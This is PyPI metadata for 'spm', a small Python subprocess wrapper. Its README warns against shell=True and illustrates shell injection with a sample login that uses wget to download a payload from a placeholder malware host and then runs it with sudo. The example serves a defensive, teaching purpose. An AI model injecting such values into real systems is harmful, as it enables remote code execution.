{"info": {"author": "Antoine Catton", "author_email": "devel at antoine dot catton dot fr", "bugtrack_url": null, "classifiers": ["Development Status :: 4 - Beta", "Environment :: Console", "Intended Audience :: Developers", "Intended Audience :: System Administrators", "License :: OSI Approved :: MIT License", "Operating System :: POSIX", "Programming Language :: Python :: 2.7", "Programming Language :: Python :: 3.3", "Programming Language :: Python :: 3.4", "Programming Language :: Unix Shell", "Topic :: System :: System Shells"], "description": "spm (SubProcessesManager)\n=========================\n\n.. code:: python\n\n    >>> import spm\n    >>> spm.run('echo', '-n', 'hello world').stdout.read()\n    'hello world'\n    >>> import functools\n    >>> git = functools.partial(spm.run, 'git')\n    >>> git('status', '-z').stdout.read().split(b'\\x00')\n    [' M spm.py', '']\n\nThis provides a very thin KISS layer on top of the python standard library's\n``subprocess`` module. This library supports Python 2 and Python 3.\n\nThis makes it easy to pipe subprocesses, and pipe subprocesses input/output\nto files.\n\nIt only has four rules:\n\n* Simple programming interface\n* Don't reimplement the wheel. (It tries uses the ``subprocess`` standard\n  module as much as possible) \n* It only does one thing, and try to do it well.\n* Use argument list instead of one command string.\n\nSecure subprocess invokation\n----------------------------\n\nFor those who don't understand the last rule. There are two ways to ways to\ninvoke subprocesses in python: One method is insecure, the other one is\nsecure.\n\n.. code:: python\n\n    import subprocess\n\n    # Insecure subprocess invocation\n    subprocess.check_call(\"echo foo\", shell=True)\n    # Secure subprocess invocation\n    subprocess.check_call(['echo', 'foo'])\n\nThe second one is secure, because it prevents shell code injection. If we over\nsimplify, the first method, could be implemented this way:\n\n.. code:: python\n\n    def insecure_check_call(command_line):\n        \"\"\"\n        Same as check_call(shell=True)\n        \"\"\"\n        # Runs /bin/bash -c \"the given command line\"\n        subprocess.check_call(['/bin/bash', '-c', command_line])\n\n\nLet's use the following code as example:\n\n.. code:: python\n\n    import subprocess\n    # Get insecure and unchecked data from a user\n    from somewhere import get_login_from_user()\n\n    def create_user():\n        cmd = \"sudo useradd '{}'\".format(get_login_from_user())\n        subprocess.check_call(cmd)\n\nA user can inject code if they enter the login\n``' || wget http://malware.example.com/malware -O /tmp && sudo /tmp/malware``.\nBecause this will execute:\n``sudo user '' || wget [...] -O /tmp && sudo /tmp/malware``.\n\nWhy another library?\n--------------------\n\n.. image:: https://imgs.xkcd.com/comics/standards.png\n   :alt: XKCD Comic strip: \"How Standards Profilef\n   :align: center\n\nHere are the existing libraries:\n\n* sh_: doing to much. The programming interface for piping commands is\n  complex and bad.\n* execute_: old, vulnerable to shell injection.\n\nAnd many other are unmaintained or worse.\n\n.. _sh: https://amoffat.github.io/sh/\n.. _execute: https://pythonhosted.org/execute/\n\n\nWhat do you mean by KISS?\n-------------------------\n\nKISS lost it original sense. Now it's just an hipster word which means \"just\nuse my library because it's cool\".\n\nHere I mean KISS in its original sense: Keep It Simple and Stupid.\n\n* Simple: this library is one file with less than 500 lines (excluding testing)\n* Stupid: this library has two functions: ``pipe()`` and ``run()``", "description_content_type": null, "docs_url": null, "download_url": "UNKNOWN", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/acatton/python-spm", "keywords": "api exec execute fork output pipe process processes redirect safe sh shell subprocess", "license": "MIT", "maintainer": null, "maintainer_email": null, "name": "spm", "package_url": "https://pypi.org/project/spm/", "platform": "UNKNOWN", "project_url": "https://pypi.org/project/spm/", "project_urls": {"Download": "UNKNOWN", "Homepage": "https://github.com/acatton/python-spm"}, "release_url": "https://pypi.org/project/spm/0.9.1/", "requires_dist": null, "requires_python": null, "summary": "SubProcess Manager provides a simple programming interface to safely run, pipe and redirect output of subprocesses.", "version": "0.9.1", "yanked": false, "html_description": "<div class=\"project-description\">\n            <pre><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">spm</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">spm</span><span class=\"o\">.</span><span class=\"n\">run</span><span class=\"p\">(</span><span class=\"s1\">'echo'</span><span class=\"p\">,</span> <span class=\"s1\">'-n'</span><span class=\"p\">,</span> <span class=\"s1\">'hello world'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">stdout</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()</span>\n<span class=\"s1\">'hello world'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">functools</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">git</span> <span class=\"o\">=</span> <span class=\"n\">functools</span><span class=\"o\">.</span><span class=\"n\">partial</span><span class=\"p\">(</span><span class=\"n\">spm</span><span class=\"o\">.</span><span class=\"n\">run</span><span class=\"p\">,</span> <span class=\"s1\">'git'</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">git</span><span class=\"p\">(</span><span class=\"s1\">'status'</span><span class=\"p\">,</span> <span class=\"s1\">'-z'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">stdout</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()</span><span class=\"o\">.</span><span class=\"n\">split</span><span class=\"p\">(</span><span class=\"sa\">b</span><span class=\"s1\">'</span><span class=\"se\">\\x00</span><span class=\"s1\">'</span><span class=\"p\">)</span>\n<span class=\"p\">[</span><span class=\"s1\">' M spm.py'</span><span class=\"p\">,</span> <span class=\"s1\">''</span><span class=\"p\">]</span>\n</pre>\n<p>This provides a very thin KISS layer on top of the python standard library\u2019s\n<tt>subprocess</tt> module. This library supports Python 2 and Python 3.</p>\n<p>This makes it easy to pipe subprocesses, and pipe subprocesses input/output\nto files.</p>\n<p>It only has four rules:</p>\n<ul>\n<li>Simple programming interface</li>\n<li>Don\u2019t reimplement the wheel. (It tries uses the <tt>subprocess</tt> standard\nmodule as much as possible)</li>\n<li>It only does one thing, and try to do it well.</li>\n<li>Use argument list instead of one command string.</li>\n</ul>\n<div id=\"secure-subprocess-invokation\">\n<h2>Secure subprocess invokation</h2>\n<p>For those who don\u2019t understand the last rule. There are two ways to ways to\ninvoke subprocesses in python: One method is insecure, the other one is\nsecure.</p>\n<pre><span class=\"kn\">import</span> <span class=\"nn\">subprocess</span>\n\n<span class=\"c1\"># Insecure subprocess invocation</span>\n<span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">check_call</span><span class=\"p\">(</span><span class=\"s2\">\"echo foo\"</span><span class=\"p\">,</span> <span class=\"n\">shell</span><span class=\"o\">=</span><span class=\"kc\">True</span><span class=\"p\">)</span>\n<span class=\"c1\"># Secure subprocess invocation</span>\n<span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s1\">'echo'</span><span class=\"p\">,</span> <span class=\"s1\">'foo'</span><span class=\"p\">])</span>\n</pre>\n<p>The second one is secure, because it prevents shell code injection. If we over\nsimplify, the first method, could be implemented this way:</p>\n<pre><span class=\"k\">def</span> <span class=\"nf\">insecure_check_call</span><span class=\"p\">(</span><span class=\"n\">command_line</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"\n    Same as check_call(shell=True)\n    \"\"\"</span>\n    <span class=\"c1\"># Runs /bin/bash -c \"the given command line\"</span>\n    <span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s1\">'/bin/bash'</span><span class=\"p\">,</span> <span class=\"s1\">'-c'</span><span class=\"p\">,</span> <span class=\"n\">command_line</span><span class=\"p\">])</span>\n</pre>\n<p>Let\u2019s use the following code as example:</p>\n<pre><span class=\"kn\">import</span> <span class=\"nn\">subprocess</span>\n<span class=\"c1\"># Get insecure and unchecked data from a user</span>\n<span class=\"kn\">from</span> <span class=\"nn\">somewhere</span> <span class=\"kn\">import</span> <span class=\"n\">get_login_from_user</span><span class=\"p\">()</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">create_user</span><span class=\"p\">():</span>\n    <span class=\"n\">cmd</span> <span class=\"o\">=</span> <span class=\"s2\">\"sudo useradd '</span><span class=\"si\">{}</span><span class=\"s2\">'\"</span><span class=\"o\">.</span><span class=\"n\">format</span><span class=\"p\">(</span><span class=\"n\">get_login_from_user</span><span class=\"p\">())</span>\n    <span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">check_call</span><span class=\"p\">(</span><span class=\"n\">cmd</span><span class=\"p\">)</span>\n</pre>\n<p>A user can inject code if they enter the login\n<tt>' || wget <span class=\"pre\">http://malware.example.com/malware</span> <span class=\"pre\">-O</span> /tmp &amp;&amp; sudo /tmp/malware</tt>.\nBecause this will execute:\n<tt>sudo user '' || wget <span class=\"pre\">[...]</span> <span class=\"pre\">-O</span> /tmp &amp;&amp; sudo /tmp/malware</tt>.</p>\n</div>\n<div id=\"why-another-library\">\n<h2>Why another library?</h2>\n<img alt='XKCD Comic strip: \"How Standards Profilef' class=\"align-center\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/f25f6da8a510d5d21082841702063bbd44a12f53/68747470733a2f2f696d67732e786b63642e636f6d2f636f6d6963732f7374616e64617264732e706e67\">\n<p>Here are the existing libraries:</p>\n<ul>\n<li><a href=\"https://amoffat.github.io/sh/\" rel=\"nofollow\">sh</a>: doing to much. The programming interface for piping commands is\ncomplex and bad.</li>\n<li><a href=\"https://pythonhosted.org/execute/\" rel=\"nofollow\">execute</a>: old, vulnerable to shell injection.</li>\n</ul>\n<p>And many other are unmaintained or worse.</p>\n</div>\n<div id=\"what-do-you-mean-by-kiss\">\n<h2>What do you mean by KISS?</h2>\n<p>KISS lost it original sense. Now it\u2019s just an hipster word which means \u201cjust\nuse my library because it\u2019s cool\u201d.</p>\n<p>Here I mean KISS in its original sense: Keep It Simple and Stupid.</p>\n<ul>\n<li>Simple: this library is one file with less than 500 lines (excluding testing)</li>\n<li>Stupid: this library has two functions: <tt>pipe()</tt> and <tt>run()</tt></li>\n</ul>\n</div>\n\n          </div>"}, "last_serial": 1491949, "releases": {"0.9.0": [{"comment_text": "", "digests": {"md5": "5de5fef2d0deec9141dea9e237349e49", "sha256": "9f8201e9ac5865fa4d3bdca110557dc1507fc17bd9a54f37bef6a7cb6daffa5e"}, "downloads": -1, "filename": "spm-0.9.0.tar.gz", "has_sig": false, "md5_digest": "5de5fef2d0deec9141dea9e237349e49", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 4844, "upload_time": "2015-04-05T09:46:14", "upload_time_iso_8601": "2015-04-05T09:46:14.655956Z", "url": "https://files.pythonhosted.org/packages/69/a7/1a359b729292b2d08a0e06bad310b5c871804ca77ee36bbd9441cc9be00a/spm-0.9.0.tar.gz", "yanked": false}], "0.9.1": [{"comment_text": "", "digests": {"md5": "edc3ff7f198b4d8e27a21d3c1d04df5f", "sha256": "c17d31035ebc553d730f3faf17e2e4041bfccba70020fdf6eb57412563a37988"}, "downloads": -1, "filename": "spm-0.9.1.tar.gz", "has_sig": false, "md5_digest": "edc3ff7f198b4d8e27a21d3c1d04df5f", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 4836, "upload_time": "2015-04-05T19:19:51", "upload_time_iso_8601": "2015-04-05T19:19:51.326538Z", "url": "https://files.pythonhosted.org/packages/94/ad/b6a1f7f5f9f95ad223ffb3fabbdac7a3ae5ff9be6a9f6075ac69b6160c45/spm-0.9.1.tar.gz", "yanked": false}]}, "urls": [{"comment_text": "", "digests": {"md5": "edc3ff7f198b4d8e27a21d3c1d04df5f", "sha256": "c17d31035ebc553d730f3faf17e2e4041bfccba70020fdf6eb57412563a37988"}, "downloads": -1, "filename": "spm-0.9.1.tar.gz", "has_sig": false, "md5_digest": "edc3ff7f198b4d8e27a21d3c1d04df5f", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 4836, "upload_time": "2015-04-05T19:19:51", "upload_time_iso_8601": "2015-04-05T19:19:51.326538Z", "url": "https://files.pythonhosted.org/packages/94/ad/b6a1f7f5f9f95ad223ffb3fabbdac7a3ae5ff9be6a9f6075ac69b6160c45/spm-0.9.1.tar.gz", "yanked": false}], "timestamp": "Fri May  8 03:04:39 2020"}